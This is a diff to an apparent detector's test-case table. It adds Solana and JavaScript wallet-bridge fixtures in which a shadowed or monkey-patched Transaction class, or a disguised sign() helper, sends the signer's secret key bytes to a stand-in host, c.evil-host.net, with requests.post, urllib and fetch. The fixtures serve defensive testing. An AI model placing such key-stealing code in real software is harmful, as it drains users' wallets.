@@ -272,6 +272,38 @@ CASES = {
         'memo_data.encode("utf-8")', "bytes(secret)"))}, main="bridge.py"),
     "keypair_bytes_inside_signed_memo": pkg({"bridge.py": sol(ix=SOL_IX.replace(
         'memo_data.encode("utf-8")', "bytes(payer)"))}, main="bridge.py"),
+    # (b) reviewer twins (PR #232): an argument-position key is excused only by a signer
+    # that resolves to a library import nobody in the package redefines.
+    "pkg_defined_transaction_posts_keypair": pkg({"bridge.py": sol().replace(
+        "from solders.transaction import Transaction\n",
+        "import requests\n\n\nclass Transaction:\n"
+        "    def __init__(self, signers, ixs, bh):\n"
+        "        requests.post(\"https://c.evil-host.net/k\", data=bytes(signers[0]))\n"
+        "        self.raw = b\"\"\n\n"
+        "    def __bytes__(self):\n"
+        "        return self.raw\n")}, main="bridge.py"),
+    "lib_transaction_patched_elsewhere": pkg({
+        "bridge.py": sol(),
+        "boot.py": "import requests\nimport solders.transaction\n\n\n"
+                   "class _T:\n    def __init__(self, signers, ixs, bh):\n"
+                   "        requests.post('https://c.evil-host.net/k', data=bytes(signers[0]))\n"
+                   "\n\nsolders.transaction.Transaction = _T\n",
+    }, main="bridge.py"),
+    "sender_sign_posts_argument": pkg({"bridge.py": sol().replace(
+        "    tx = Transaction([payer], [ix], Hash.from_string(blockhash))\n",
+        "    sender.sign(payer)\n"
+        "    tx = Transaction([payer], [ix], Hash.from_string(blockhash))\n").replace(
+        "MEMO = Pubkey",
+        "class Sender:\n    def sign(self, k):\n"
+        "        return urllib.request.urlopen(urllib.request.Request(\n"
+        "            \"https://c.evil-host.net/k\", data=bytes(k)))\n\n\n"
+        "sender = Sender()\nMEMO = Pubkey")}, main="bridge.py"),
+    "js_uploader_sign_posts_argument": pkg({"index.js": JS_SOL.replace(
+        "PARAMS", "wire").replace(
+        "  tx.sign(kp);\n",
+        "  const uploader = { sign: (k) => fetch('https://c.evil-host.net/k', "
+        "{ method: 'POST', body: Buffer.from(k.secretKey) }) };\n"
+        "  uploader.sign(kp);\n  tx.sign(kp);\n")}, main="index.js"),
     "js_signed_tx_plus_secret_key": pkg(
         {"index.js": JS_SOL.replace("PARAMS", "wire, Array.from(kp.secretKey)")},
         main="index.js"),
